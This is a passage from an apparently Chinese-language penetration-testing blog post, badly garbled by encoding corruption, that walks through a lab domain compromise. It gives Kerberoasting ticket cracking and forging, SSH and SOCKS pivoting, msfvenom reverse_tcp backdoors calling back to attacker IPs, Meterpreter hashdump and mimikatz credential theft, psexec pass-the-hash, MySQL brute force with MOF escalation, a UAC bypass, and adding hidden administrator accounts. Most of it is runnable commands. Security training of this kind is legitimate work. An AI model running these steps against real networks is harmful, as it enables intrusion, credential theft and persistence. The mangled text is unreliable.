python3ç¯å¢ƒè¿è¡Œï¼ˆå°†ç¥¨æ®æ‹–åˆ°æœ¬åœ°ç ´è§£ï¼‰python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5ã€é‡å†™ç¥¨æ®ï¼ˆå±äºåç»­æ”»å‡»ï¼Œä¸ä¸€å®šä¼šæˆåŠŸï¼Œ-u500æŒ‡çš„æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œ-g512æŒ‡çš„æ˜¯ç®¡ç†å‘˜ç»„ï¼‰</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # å°†ç”Ÿæˆçš„ç¥¨æ®æ³¨å…¥å†…å­˜</code></pre><p>6ã€åˆ©ç”¨</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="éš§é“æŠ€æœ¯"><a href="#éš§é“æŠ€æœ¯" class="headerlink" title="éš§é“æŠ€æœ¯"></a>éš§é“æŠ€æœ¯</h1><h2 id="sshéš§é“"><a href="#sshéš§é“" class="headerlink" title="sshéš§é“"></a>sshéš§é“</h2><p>é€šå¸¸ï¼Œæˆ‘ä»¬ç”¨äºè°ƒè¯•çš„è®¡ç®—æœºæ— æ³•è¿œç¨‹è®¿é—®ä½äºå±€åŸŸç½‘ä¸­çš„å¾…è°ƒè¯•è®¾å¤‡ã€‚é€šè¿‡ ssh çš„ç«¯å£è½¬å‘(åˆç§° ssh éš§é“)æŠ€æœ¯ï¼Œå¯ä»¥å®ç°è¿™ç§è¿œç¨‹è°ƒè¯•åŠŸèƒ½ã€‚ssh å®¢æˆ·ç«¯è¿è¡Œäºæœ¬åœ°æœºå™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼šç™»å½•åˆ°ç›®æ ‡æœºå™¨å¹¶åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚å®ƒå¯ä»¥å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œä¸ºä¸å®‰å…¨ç½‘ç»œä¸Šä¸¤ä¸ªä¸å—ä¿¡ä»»çš„ä¸»æœºæä¾›å®‰å…¨çš„åŠ å¯†é€šä¿¡ã€‚X11 è¿æ¥ã€ä»»æ„ TCP ç«¯å£å’Œ UNIX åŸŸå¥—æ¥å­—ä¹Ÿå¯ä»¥é€šè¿‡ ssh å®‰å…¨é€šé“è¿›è¡Œè½¬å‘ã€‚ssh è¿æ¥å¹¶ç™»å½•åˆ°æŒ‡å®šçš„ä¸»æœºå(ç”¨æˆ·åå¯é€‰)ã€‚å¦‚æœæŒ‡å®šäº†å‘½ä»¤ï¼Œå‘½ä»¤å°†åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨æœ¬æœº shell é‡Œæ‰§è¡Œã€‚</p><p>ssh ç«¯å£è½¬å‘ç›¸å…³çš„å¸¸ç”¨é€‰é¡¹å¦‚ä¸‹ï¼š</p><hr><p><strong>-C</strong></p><p>è¯·æ±‚å‹ç¼©æ‰€æœ‰æ•°æ®(åŒ…æ‹¬ stdinã€stdoutã€stderr å’Œç”¨äºè½¬å‘çš„ X11ã€TCP å’Œ UNIX åŸŸè¿æ¥çš„æ•°æ®)ã€‚å‹ç¼©ç®—æ³•ä¸ gzip ä½¿ç”¨çš„ç®—æ³•ç›¸åŒï¼Œå‹ç¼©çº§åˆ«ç”± ssh åè®®ç‰ˆæœ¬ 1 çš„ CompressionLevel é€‰é¡¹æ§åˆ¶ã€‚åœ¨è°ƒåˆ¶è§£è°ƒå™¨çº¿è·¯å’Œå…¶ä»–æ…¢é€Ÿè¿æ¥ä¸Šé‡‡ç”¨å‹ç¼©æ˜¯å¯å–çš„ï¼Œä½†å®ƒä¼šå‡æ…¢å¿«é€Ÿç½‘ç»œä¸Šçš„é€Ÿåº¦ã€‚</p><hr><p><strong>-f</strong></p><p>è¯·æ±‚ ssh åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰è½¬åˆ°åå°ã€‚å¦‚æœç”¨æˆ·å¸Œæœ› ssh åœ¨åå°è¿è¡Œï¼Œä½† ssh éœ€è¦ç”¨æˆ·æä¾›å¯†ç æˆ–å£ä»¤ï¼Œä½¿ç”¨ -f é€‰é¡¹å°±å¾ˆæœ‰ç”¨ï¼Œåœ¨ç”¨æˆ·è¾“å…¥å¯†ç ä¹‹åï¼Œssh å°±ä¼šè½¬å…¥åå°è¿è¡Œã€‚è¿™ä¸ªé€‰é¡¹éšå«äº† -n é€‰é¡¹çš„åŠŸèƒ½(-n é€‰é¡¹å°† stdin é‡å®šå‘åˆ° /dev/nullï¼Œä»è€Œé¿å…åå°è¿›ç¨‹è¯» stdin)ã€‚åœ¨è¿œç¨‹ç«™ç‚¹ä¸Šå¯åŠ¨ X11 ç¨‹åºçš„æ¨èæ–¹æ³•æ˜¯ä½¿ç”¨ â€œssh -f host xtermâ€ ã€‚</p><p>å¦‚æœ ExitOnForwardFailure é…ç½®é€‰é¡¹è®¾ç½®çš„æ˜¯ â€œyesâ€ï¼Œåˆ™ä½¿ç”¨ -f é€‰é¡¹å¯åŠ¨çš„ ssh å®¢æˆ·ç«¯ä¼šç­‰æ‰€æœ‰çš„è¿œç¨‹ç«¯å£è½¬å‘å»ºç«‹æˆåŠŸåæ‰å°†è‡ªå·±è½¬åˆ°åå°è¿è¡Œã€‚</p><hr><p><strong>-n</strong></p><p>å°† stdin é‡å®šå‘åˆ° /dev/null (å®é™…ä¸Šæ˜¯ä¸ºäº†é˜²æ­¢åå°è¿›ç¨‹ä»stdinè¯»å–æ•°æ®)ã€‚å½“ ssh åœ¨åå°è¿è¡Œæ—¶å¿…é¡»ä½¿ç”¨æ­¤é€‰é¡¹ã€‚</p><p>ä¸€ä¸ªå¸¸è§çš„æŠ€å·§æ˜¯ä½¿ç”¨å®ƒåœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œ X11 ç¨‹åºã€‚ä¾‹å¦‚ï¼Œ<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> å°†åœ¨ shadows.cs.hut.fi ä¸Šå¯åŠ¨ emacs ç¨‹åºã€‚X11 çš„è¿æ¥å°†é€šè¿‡åŠ å¯†é€šé“è‡ªåŠ¨è½¬å‘ã€‚ssh ç¨‹åºå°†åœ¨åå°è¿è¡Œã€‚(å¦‚æœ ssh éœ€è¦è¯·æ±‚å¯†ç æˆ–å£ä»¤ï¼Œåˆ™æ­¤æ“ä½œæ— æ•ˆï¼›å‚è§-fé€‰é¡¹ã€‚)</p><hr><p><strong>-N</strong></p><p>ä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚æ­¤é€‰é¡¹ç”¨äºåªéœ€è¦ç«¯å£è½¬å‘åŠŸèƒ½æ—¶ã€‚</p><hr><p><strong>-g</strong></p><p>å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°æœ¬åœ°è½¬å‘ç«¯å£ã€‚å¦‚æœç”¨äºå¤šè·¯å¤ç”¨è¿æ¥ï¼Œåˆ™å¿…é¡»åœ¨ä¸»è¿›ç¨‹ä¸ŠæŒ‡å®šæ­¤é€‰é¡¹ã€‚</p><hr><p><strong>-t</strong></p><p>å¼ºåˆ¶åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œä»»æ„çš„åŸºäºå±å¹•çš„ç¨‹åºæ—¶(ä¾‹å¦‚ï¼Œå®ç°èœå•æœåŠ¡)ï¼Œåˆ†é…ä¼ªç»ˆç«¯å¾ˆæœ‰ç”¨ã€‚ä½¿ç”¨å¤šä¸ª -t é€‰é¡¹åˆ™ä¼šå¼ºåˆ¶åˆ†é…ç»ˆç«¯ï¼Œå³ä½¿ ssh æ²¡æœ‰æœ¬åœ°ç»ˆç«¯ã€‚</p><hr><p><strong>-T</strong></p><p>ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯ã€‚</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>æ•°æ®ä»æœ¬æœºè½¬å‘åˆ°è¿œç¨‹ã€‚æœ¬æœºä¸ŠæŒ‡å®š TCP ç«¯å£æˆ– UNIX å¥—æ¥å­—çš„è¿æ¥å°†è¢«è½¬å‘åˆ°ç›®æ ‡æœºä¸ŠæŒ‡å®šç«¯å£æˆ–å¥—æ¥å­—ã€‚</p><p>ä¸Šè¿°å‚æ•°ä¸­ï¼Œbind_address æŒ‡æœ¬åœ°åœ°å€ï¼›port æŒ‡æœ¬åœ°ç«¯å£ï¼›local_socket æŒ‡æœ¬åœ° UNIX å¥—æ¥å­—ï¼›host æŒ‡è¿œç¨‹ä¸»æœºåœ°å€ï¼›hostport æŒ‡è¿œç¨‹ç«¯å£ï¼›remote_socket æŒ‡è¿œç¨‹ UNIX å¥—æ¥å­—ã€‚</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh ç«¯å£è½¬å‘æ¨¡å¼</strong></p><p>ssh çš„ç«¯å£è½¬å‘æœ‰ä¸‰ç§æ¨¡å¼ï¼š</p><ul><li><p><strong>æœ¬åœ°ï¼šssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>å°†æœ¬åœ°æœºç›‘å¬ç«¯å£ local_listen_port ä¸Šçš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ç«¯å£ remote_host:remote_port</p></li><li><p><strong>è¿œç¨‹ï¼šssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>å°†ä»£ç†æœºç›‘å¬ç«¯å£ agent_listen_port ä¸Šçš„æ•°æ®è½¬å‘åˆ°æœ¬åœ°ç«¯å£ local_host:local_port</p></li><li><p><strong>åŠ¨æ€ï¼šssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>æ­£å‘è¿æ¥</strong></p><p>WEBæœåŠ¡å™¨æ‰§è¡Œ</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>åå‘è¿æ¥</strong></p><p>åœ¨æ”»å‡»æœºä¸Šå¯åŠ¨ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # å°†æœ¬åœ°çš„22ç«¯å£è½¬å‘åˆ°192.168.0.115 çš„2222ç«¯å£</code></pre><p>æ”»å‡»æœºä¸Šå†æ‰§è¡Œ</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socketä»£ç†</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„"><a href="#ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„" class="headerlink" title="ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„"></a>ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>ç”Ÿæˆmetaploitåé—¨</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>å½“è¿è¡Œåé—¨ï¼Œå¾—åˆ°åå¼¹shellå</p><p><strong>æ˜ å°„ç«¯å£:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>æ­¤æ—¶æˆ‘ä»¬è®¿é—® æœ¬æœºçš„2020ç«¯å£ å³æ‰“å¼€192.168.0.115:2020 å®é™…ä¸Šè®¿é—®çš„æ˜¯ 10.10.10.128:80 çš„æœåŠ¡</p><p><strong>ç«¯å£è½¬å‘</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #å°†è‚‰é¸¡çš„3389ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„5555ç«¯å£rdesktop 127.0.0.1:5555</code></pre><p><strong>æŸ¥çœ‹åˆ—è¡¨</strong></p><pre><code>portfwd list</code></pre><p><strong>æ¸…ç©ºåˆ—è¡¨</strong></p><pre><code>portfwd flush</code></pre><h2 id="socketéš§é“"><a href="#socketéš§é“" class="headerlink" title="socketéš§é“"></a>socketéš§é“</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>â€‹    ä¸‹è½½åœ°å€:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>è§£å‹ç¼–è¯‘:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #ç¼–è¯‘åä¼šåˆ›å»ºä¸€ä¸ªsrcæ–‡ä»¶å¤¹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kaliæœºä½¿ç”¨ï¼š</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>ç­‰å¾…è¿œç¨‹socks5æœåŠ¡å™¨è®¿é—®æœ¬åœ°1080ç«¯å£ï¼Œåˆ›å»ºç«¯å£1080ä¸æœ¬åœ°ç«¯å£1088çš„è¿æ¥é€šé“</p><p>webæœåŠ¡å™¨:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>åˆ©ç”¨proxychainsè¿›è¡ŒSocks5ä»£ç†</p><p> ç¼–è¾‘proxychainså·¥å…·</p><pre><code>vim /etc/proxychains.conf</code></pre><p>æ³¨é‡Šæ‰socks4ï¼ŒåŠ ä¸Šsocks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kailæœºä½¿ç”¨ä»£ç†è®¿é—®ï¼š</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>å°±ä¼šæˆåŠŸè®¿é—®</p><p>ä½¿ç”¨nmapæ‰«æ</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="è·¨è·¯ç”±æ‰«æ"><a href="#è·¨è·¯ç”±æ‰«æ" class="headerlink" title="è·¨è·¯ç”±æ‰«æ"></a>è·¨è·¯ç”±æ‰«æ</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°åå¼¹shell</p><pre><code>getuid  æŸ¥çœ‹å½“å‰ç”¨æˆ·ifconfig  è·å–ç½‘å¡ä¿¡æ¯run get_local_subnets è·å–è·¯ç”±ä¿¡æ¯run autoroute -p æŸ¥çœ‹å½“å‰è·¯ç”±run autoroute -s 10.10.10.0/24 å¢åŠ è·¯ç”± </code></pre><p>ä½¿ç”¨socks4aæ¨¡å—</p><pre><code>use auxiliary/server/socks4a</code></pre><p>ã€€SRVHOSTï¼šç›‘å¬çš„ipåœ°å€ï¼Œé»˜è®¤ä¸º0.0.0.0ï¼Œä¸€èˆ¬ä¸éœ€è¦æ›´æ”¹ã€‚<br>   SRVPORTï¼šç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤ä¸º1080ã€‚</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>è®¾ç½®ç«¯å£</p><pre><code>set SRVPORT 1044exploit</code></pre><p>ç„¶åé…ç½®proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>ä½¿ç”¨nmapæ‰«æ</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>ä¹Ÿå¯ä»¥ç”¨æµè§ˆå™¨è®¿é—®</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>ç¼ºç‚¹:</p><p>æ— æ³•è¿›è¡Œçˆ†ç ´(å¦‚hydra)ç­‰ä¸€äº›æ“ä½œ</p><h1 id="MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€"><a href="#MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€" class="headerlink" title="MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€"></a>MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°2003æœåŠ¡å™¨åå¼¹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>æŸ¥çœ‹è·¯ç”±è¡¨</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>å¢åŠ è·¯ç”±</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>æŸ¥çœ‹è·¯ç”±åˆ—è¡¨</p><pre><code>run autoroute -p</code></pre><p>æ¸…ç©ºè·¯ç”±</p><pre><code>run autoroute -d</code></pre><p>ææƒå‘½ä»¤:</p><pre><code>sysinfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</code></pre><pre><code>ps æŸ¥çœ‹è¿›ç¨‹</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid å½“å‰ç”¨æˆ·getprivs å°½å¯èƒ½æå‡æƒé™getsystem é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>å¢åŠ ç®¡ç†å‘˜</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>æ£€æµ‹å­˜æ´»ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> å¢åŠ è·¯ç”±è¡¨</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #ç«¯å£é»˜è®¤æ˜¯1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445å¼€æ”¾ï¼Œå°è¯•hashæ”»å‡»</p><p>hashè·å–</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>ä½¿ç”¨mimikatzæ¥è·å–æ›´å¤šå¯†ç </p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç meterpreter &gt; run getgui -e #å¼€å¯3389ç«¯å£meterpreter &gt; run getgui -u sakura -p 123456 #å¢åŠ ç”¨æˆ·</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #ç™»å½•3389ç«¯å£</code></pre><h1 id="MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹"><a href="#MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹" class="headerlink" title="MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹"></a>MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p><p>æ¸—é€å‰æ:æ‹¿åˆ°äº†åŸŸå®¢æˆ·æœº2008çš„shell</p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°2008æœåŠ¡å™¨åå¼¹shell</p><p>æ‰«æå†…ç½‘çš„æœºå™¨</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>åŠ å…¥è·¯ç”±</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>ä½¿ç”¨æ‰«æå™¨</p><pre><code>use scanner/portscan/tcp  #é»˜è®¤æ‰«æ1-10000ç«¯å£set rhost 10.10.1.3exploit</code></pre><p>é€šè¿‡æ‰«æå‘ç° 10.10.1.3 çš„3306ç«¯å£å­˜åœ¨mysqlæœåŠ¡</p><p>è¿›è¡Œå¼±å£ä»¤æ”»å‡»</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>æˆåŠŸçˆ†ç ´å‡ºå¼±å£ä»¤</p><p>å°è¯•ä½¿ç”¨mysql_mofææƒ,å¾—åˆ°åŸŸå®¢æˆ·æœº2003çš„session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>ç°åœ¨æ‹¿åˆ°äº†2003çš„ç³»ç»Ÿæƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸€äº›å‘½ä»¤è¿›è¡Œä¿¡æ¯æœé›†</p><pre><code>new view /domain:moonsec #æŸ¥çœ‹å½“å‰åŸŸç”¨æˆ·</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>å¾—åˆ°ç›®æ ‡æœºip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #è·å–æ‰€æœ‰åŸŸçš„ç”¨æˆ·åˆ—è¡¨net group /domain #è·å–åŸŸç”¨æˆ·ç»„ä¿¡æ¯net group &quot;domain admins&quot; /domain #è·å–å½“å‰åŸŸç®¡ç†å‘˜ä¿¡æ¯net time /domain #æŸ¥çœ‹åŸŸå®é™…åŠåŸŸæœåŠ¡å™¨åå­—</code></pre><p>å¯ä»¥å¾—åˆ°åŸŸæ§ä¿¡æ¯</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #è¿™ä¸ªå°±æ˜¯åŸŸæ§</code></pre><p>å› ä¸ºæ™®é€šåŸŸç”¨æˆ· éœ€è¦æ›´æ”¹ç³»ç»Ÿä¿¡æ¯ éƒ½éœ€è¦é€šè¿‡åŸŸç®¡ç†å‘˜çš„æ“ä½œ è¦è¾“å…¥è´¦å·å¯†ç </p><p>æŠ“æ˜æ–‡ mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>å°è¯•èƒ½å¦æŠ“æ˜æ–‡</p><pre><code>meterpreter &gt; kerberos #è·å–æ˜æ–‡å¯†ç </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>ç°åœ¨æƒ³è¦è·å–session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>å¾—åˆ°åŸŸæ§shellï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><pre><code>get privsgetsystem</code></pre><p>ä½¿ç”¨uacææƒ</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>ææƒæˆåŠŸ</p><p>è·å–hashå¯†ç </p><pre><code>meterpreter &gt; hashdump#æˆ–è€…meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatzæŠ“æ˜æ–‡å¯†ç </p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç meterpreter &gt; kerberos #è·å–æ˜æ–‡å¯†ç meterpreter &gt; mimikatz_command -f samd::hashes #å¦ä¸€ç§æ–¹å¼è·å–hashå€¼</code></pre><p>æƒé™ç»´æŒï¼šè¿›ç¨‹æ³¨å…¥</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>å¼€å¯åŸŸæ§è¿œç¨‹è¿æ¥</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>ä½¿ç”¨socks4aè¿æ¥3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>é…ç½®pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>ç™»å½•3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #ç™»å½•3389ç«¯å£</code></pre><p>å¢åŠ è´¦å·</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;åŸŸçš„æ­å»º&quot;&gt;&lt;a href=&quot;#åŸŸçš„æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;åŸŸçš„æ­å»º&quot;&gt;&lt;/a&gt;åŸŸçš„æ­å»º&lt;/h1&gt;&lt;p&gt;å®éªŒç¯å¢ƒ:&lt;/p&gt;
